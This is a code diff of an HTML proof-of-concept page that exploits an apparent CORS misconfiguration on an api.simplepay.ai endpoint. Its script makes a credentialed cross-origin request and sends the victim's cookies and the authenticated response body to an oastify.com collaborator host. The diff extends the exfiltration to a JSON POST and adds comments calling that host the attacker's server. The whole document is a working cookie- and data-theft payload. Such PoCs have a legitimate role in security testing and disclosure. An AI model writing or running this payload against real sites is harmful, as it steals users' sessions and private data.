@@ -1,18 +1,34 @@
 <html>
 <body>
    <script>
+      // Create an XHR object for the cross-origin request
       var xhr = new XMLHttpRequest();
+      
+      // Send a GET request to the vulnerable endpoint, including credentials (cookies)
       xhr.open('GET', 'https://api.simplepay.ai/app', true);
-      xhr.withCredentials = true;
+      xhr.withCredentials = true;  // Ensures that cookies are sent along with the request
+      
+      // When the request completes, capture the response and cookies
       xhr.onreadystatechange = function() {
          if (xhr.readyState == 4 && xhr.status == 200) {
-            // Send the data back to the attacker's server
-            fetch('https://akywmtmqwe6v3o5x3joou6zprgx7l39s.oastify.com?c='+btoa(document.cookie), {
+            // Get the cookies from the current document
+            var cookies = document.cookie;
+
+            // Send both the response text and cookies to the attacker's server
+            fetch('https://phabj8j5tt3a032c0yl3rlw4ovumij68.oastify.com', {
                method: 'POST',
-               body: xhr.responseText
+               headers: {
+                  'Content-Type': 'application/json'
+               },
+               body: JSON.stringify({
+                  cookies: cookies,         // Send victim's cookies
+                  response: xhr.responseText // Send response data from vulnerable server
+               })
             });
          }
       };
+      
+      // Send the request
       xhr.send();
    </script>
 </body>
